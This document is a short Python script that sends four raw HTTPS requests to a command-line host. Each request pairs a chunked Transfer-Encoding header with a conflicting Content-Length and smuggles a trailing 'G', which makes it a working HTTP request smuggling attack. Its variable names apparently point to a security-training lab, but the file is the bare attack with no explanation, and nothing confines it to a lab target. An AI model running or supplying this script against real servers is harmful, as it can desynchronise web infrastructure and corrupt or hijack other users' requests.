import socket
import ssl
import sys

def send_request(host_burp):
    context = ssl.create_default_context()
    with socket.create_connection((host_burp, 443)) as sock:
        with context.wrap_socket(sock, server_hostname=host_burp) as ssock:
            request = (
                "POST / HTTP/1.1\r\n"
                f"Host: {host_burp}\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Connection: keep-alive\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Content-Length: 6\r\n\r\n"
                "0\r\n"
                "\r\n"
                "G\r\n\r\n"
            )
            ssock.sendall(request.encode())

            response = b""
            while True:
                data = ssock.recv(4096)
                if not data:
                    break
                response += data

            return response.decode()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    host_burp = burp_url[8:]

    for _ in range(4):  # Pętla wysyłająca zapytanie 4 razy
        response = send_request(host_burp)
        print(response)
